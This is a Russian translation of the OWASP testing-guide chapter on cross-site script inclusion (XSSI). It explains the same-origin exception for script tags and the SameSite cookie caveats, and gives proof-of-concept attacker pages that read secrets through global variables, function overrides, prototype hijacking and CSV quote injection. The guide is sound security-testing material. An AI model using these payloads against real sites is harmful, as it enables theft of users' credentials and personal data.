# Межсайтовое включение скриптов (XSSI)

| ID |
| --- |
| WSTG-CLNT-13 |

## Резюме

Уязвимость межсайтового включения скриптов (Cross-Site Script Inclusion, XSSI) позволяет осуществлять утечку конфиденциальных данных через междоменные границы (cross-origin / cross-domain). Конфиденциальные данные могут включать сведения, связанные с аутентификацией (состояния сеансов входа, cookie, токены авторизации, идентификаторы сессий и т. д.), либо персональные данные пользователей (адреса электронной почты, номера телефонов, реквизиты банковских карт, номера социального страхования и др.). XSSI представляет собой клиентскую атаку, схожую с подделкой межсайтовых запросов (Cross-Site Request Forgery, CSRF), но преследующую иную цель. В то время как CSRF использует контекст аутентифицированного пользователя для выполнения действий, изменяющих состояние системы на странице жертвы (например, перевод денежных средств на счет злоумышленника, повышение привилегий, сброс пароля и т. д.), XSSI использует клиентский JavaScript для извлечения конфиденциальных данных из аутентифицированных сессий.

По умолчанию веб-сайтам разрешен доступ к данным только в том случае, если они принадлежат тому же источнику. Это ключевой принцип безопасности веб-приложений, регламентируемый правилом ограничения домена (Same-Origin Policy, SOP, согласно [RFC 6454](https://tools.ietf.org/html/rfc6454)). Источник (origin) определяется комбинацией схемы URI (HTTP или HTTPS), имени хоста и номера порта. Однако данная политика не распространяется на включение ресурсов через HTML-тег `<script>`. Это исключение необходимо, поскольку без него веб-сайты не смогли бы подключать сторонние сервисы, выполнять сбор аналитики трафика или использовать рекламные платформы.

Когда браузер загружает страницу с тегами `<script>`, соответствующие ресурсы запрашиваются со стороннего домена (cross-origin). Затем эти ресурсы исполняются в том же контексте безопасности, что и включающая страница или браузер, что создает возможность для утечки конфиденциальных данных. В большинстве случаев это достигается с помощью JavaScript, однако подключаемый ресурс вовсе не обязан являться файлом JavaScript с MIME-типом `text/javascript` или расширением `.js`.

Исторические уязвимости браузеров (например, в IE9/10) допускали утечку данных через подробные сообщения об ошибках времени выполнения. Данная техника более не актуальна для современных браузеров. Устанавливая атрибут charset тега `<script>`, атакующий или тестировщик может принудительно задать кодировку UTF-16, что в ряде случаев открывает возможность утечки данных для других форматов (например, JSON). Подробнее об этих атаках см. в исследовании [Identifier based XSSI attacks](https://www.mbsd.jp/Whitepaper/xssi.pdf).

## Цели тестирования

- Локализовать конфиденциальные данные в рамках системы.
- Оценить возможность утечки конфиденциальных данных с использованием различных техник.

## Методика тестирования

### Особенности использования атрибута SameSite для cookie

Приведенные ниже примеры опираются на то, что браузер прикрепляет аутентификационные cookie жертвы к кросс-сайтовому запросу `<script src="...">` — загрузке подресурса (subresource load), а не навигации верхнего уровня (top-level navigation). Согласно поведению атрибута [`SameSite`](../06.%20Session%20Management%20Testing/02.%20Cookies%20Attributes.md#атрибут-samesite), описанному в разделе об атрибутах cookie, cookie со значением `Lax` не отправляются в запросах подресурсов, поэтому по умолчанию данные PoC-сценарии не приведут к утечке данных в браузере, использующем политику `Lax` по умолчанию (все браузеры на базе Chromium с 2020 года), если только для сессионного cookie явно не установлено `SameSite=None; Secure`.

Это не означает, что сама уязвимость устранена — воспроизведение теперь напрямую зависит от конфигурации `SameSite` у cookie и тестируемого браузера. Проверяйте заголовок `Set-Cookie` напрямую. Повторное тестирование в Firefox или Safari не поможет, если PoC не сработал: загрузка `<script src="...">` со стороннего сайта является сторонним запросом (third-party request), а Firefox по умолчанию изолирует (partitions), тогда как Safari полностью блокирует сторонние cookie, предотвращая передачу сессионных cookie.

### Сбор данных в аутентифицированных и неаутентифицированных сессиях

Определите эндпоинты, отвечающие за передачу конфиденциальных данных, выясните требуемые параметры и зафиксируйте все релевантные динамически и статически генерируемые ответы JavaScript с использованием аутентифицированных сессий. Особое внимание уделяйте конфиденциальным данным, передаваемым с использованием [JSONP](https://en.wikipedia.org/wiki/JSONP). Чтобы обнаружить динамически генерируемые ответы JavaScript, сформируйте запросы от аутентифицированного и неаутентифицированного пользователя, а затем сравните их. Если ответы различаются, ресурс является динамическим; в противном случае — статическим. Для упрощения этой задачи можно использовать специализированный инструмент, например, [плагин Файта Хайльперина для Burp Suite (DetectDynamicJS)](https://github.com/luh2/DetectDynamicJS). Обязательно проверяйте другие типы файлов помимо JavaScript: атака XSSI не ограничивается исключительно файлами скриптов.

### Определение возможности утечки конфиденциальных данных через JavaScript

Тестировщикам следует проанализировать код на предмет следующих каналов утечки данных через уязвимости XSSI:

1. Глобальные переменные (Global variables)
2. Параметры глобальных функций (Global function parameters)
3. CSV (значения, разделенные запятыми) с кражей строковых литералов через кавычки
4. Построение цепочки прототипов с использованием `this`

### 1. Утечка конфиденциальных данных через глобальные переменные

API-ключ сохраняется в JavaScript-файле по адресу `https://victim.com/internal/api.js` на целевом ресурсе жертвы `victim.com`, доступном только авторизованным пользователям. Злоумышленник настраивает собственный веб-сайт `attackingwebsite.com` и использует тег `<script>` для подключения этого JavaScript-файла.

Содержимое `https://victim.com/internal/api.js`:

```javascript
(function() {
  window.secret = "supersecretUserAPIkey";
})();
```

Сайт атакующего `attackingwebsite.com` содержит файл `index.html` со следующим кодом:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global variables</title>
  </head>
  <body>
    <h1>Leaking data via global variables</h1>
    <script src="https://victim.com/internal/api.js"></script>
    <div id="result">
    </div>
    <script>
      var div = document.getElementById("result");
      div.innerHTML = "Your secret data <b>" + window.secret + "</b>";
    </script>
  </body>
</html>
```

В данном примере жертва аутентифицирована на `victim.com`. Злоумышленник заманивает жертву на `attackingwebsite.com` методами социальной инженерии, фишинговой рассылкой и т. д. Браузер жертвы загружает `api.js`, в результате чего конфиденциальные данные утекают через глобальную переменную JavaScript и выводятся на страницу с помощью свойства `innerHTML`.

### 2. Утечка конфиденциальных данных через параметры глобальных функций

Этот пример аналогичен предыдущему, за тем исключением, что `attackingwebsite.com` использует глобальную функцию JavaScript для извлечения конфиденциальных данных путем переопределения глобальной функции жертвы.

Содержимое `https://victim.com/internal/api.js`:

```javascript
(function() {
  var secret = "supersecretAPIkey";
  window.globalFunction(secret);
})();
```

На сайте атакующего `attackingwebsite.com` страница `index.html` содержит следующий код:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global function parameters</title>
  </head>
  <body>
    <div id="result">
    </div>
    <script>
      function globalFunction(param) {
        var div = document.getElementById("result");
        div.innerHTML = "Your secret data: <b>" + param + "</b>";
      }
    </script>
    <script src="https://victim.com/internal/api.js"></script>
  </body>
</html>
```

Существуют и другие уязвимости XSSI, способные приводить к утечке конфиденциальных данных либо через цепочки прототипов JavaScript, либо через вызовы глобальных функций. Подробнее о подобных векторах см. в исследовании [The Unexpected Dangers of Dynamic JavaScript](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf).

### 3. Утечка конфиденциальных данных через кражу CSV с кавычками

Для осуществления утечки данных атакующему/тестировщику необходимо иметь возможность внедрять код JavaScript в структуру данных CSV. Следующий фрагмент кода взят из исследовательского документа Такэси Тэрады (Takeshi Terada) [Identifier based XSSI attacks](https://www.mbsd.jp/Whitepaper/xssi.pdf).

```text
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: xxxx

1,"___","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"___","zzz@example.com","03-0000-0099"
```

В данном примере использование полей `___` в качестве точек внедрения и вставка строковых литералов JavaScript на их место дает следующий результат:

```text
1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"*/}//","zzz@example.com","03-0000-0099"
```

[Джереми Гроссман описал аналогичную уязвимость в Gmail](https://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html) в 2006 году, которая позволяла извлекать контакты пользователя в формате JSON. В том случае данные поступали из Gmail и парсились движком JavaScript браузера с использованием неявного конструктора Array для утечки данных. Злоумышленник мог получить доступ к этому массиву с конфиденциальными данными, объявив и переопределив внутренний конструктор Array следующим образом:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking gmail contacts via JSON </title>
  </head>
  <body>
    <script>
      function Array() {
        // перехват данных
      }
    </script>
    <script src="https://mail.google.com/mail/?_url_scrubbed_"></script>
  </body>
</html>
```

### 4. Утечка конфиденциальных данных через цепочку прототипов с использованием `this`

В языке JavaScript ключевое слово `this` обладает динамической областью видимости. Это означает, что если функция вызывается для объекта, `this` указывает на этот объект, даже если сама вызываемая функция ему изначально не принадлежала. Данная особенность может применяться для перехвата данных. В следующем примере с [демонстрационной страницы Себастьяна Лекиса (Sebastian Lekies)](https://web.archive.org/web/20210107144812/http://sebastian-lekies.de/leak/) конфиденциальные данные хранятся в массиве. Атакующий может переопределить метод `Array.prototype.forEach` собственной функцией. Если какой-либо код вызывает функцию `forEach` на экземпляре массива, содержащего секретные значения, подконтрольная злоумышленнику функция будет вызвана с контекстом `this`, указывающим на объект, содержащий конфиденциальные данные.

Ниже приведен фрагмент файла JavaScript, содержащего конфиденциальные данные (`javascript.js`):

```javascript
...
(function() {
  var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];

  secret.forEach(function(element) {
    // выполнение операций
  });  
})();
...
```

Секретные данные могут быть извлечены с помощью следующего кода JavaScript:

```html
...
 <div id="result">

    </div>
    <script>
      Array.prototype.forEach = function(callback) {
        var resultString = "Your secret values are: <b>";
        for (var i = 0, length = this.length; i < length; i++) {
          if (i > 0) {
            resultString += ", ";
          }
          resultString += this[i];
        }
        resultString += "</b>";
        var div = document.getElementById("result");
        div.innerHTML = resultString;
      };
    </script>
    <script src="https://victim.com/..../javascript.js"></script>
...
```
